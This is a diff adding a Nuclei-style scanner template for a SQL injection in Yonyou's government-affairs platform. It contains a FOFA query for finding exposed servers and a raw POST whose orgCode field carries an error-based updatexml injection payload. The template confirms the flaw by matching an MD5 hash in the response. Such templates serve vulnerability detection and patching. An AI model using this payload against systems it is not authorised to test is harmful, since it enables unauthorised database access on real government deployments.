@@ -1,0 +1,35 @@
+id: yonyou-grp-a-cloud-selectMaUser-sqli
+info:
+  name: 用友政务系统 selectMaUser 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://bdziyi.com/67193/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: (body="eyeclose.png" && body="用友") || body="/df/access/public/pf/portal" || body="/pf/portal/login/css/foundation-datepicker.css" || body="/df/portal/getYearRgcode.do"
+    tips:
+    repair:
+    version:
+  tags: yonyou,sqli,grpacloud
+
+http:
+  - raw:
+      - |
+        POST /ma/api/selectMaUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.2307.6 Safari/537.36
+        Content-Length: 88
+
+        {"orgCode":"1' AND (updatexml(1,concat(0x7e,(select md5('1')),0x7e),1)) AND '1'='1"}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'c4ca4238a0b923820dc')
+        condition: and
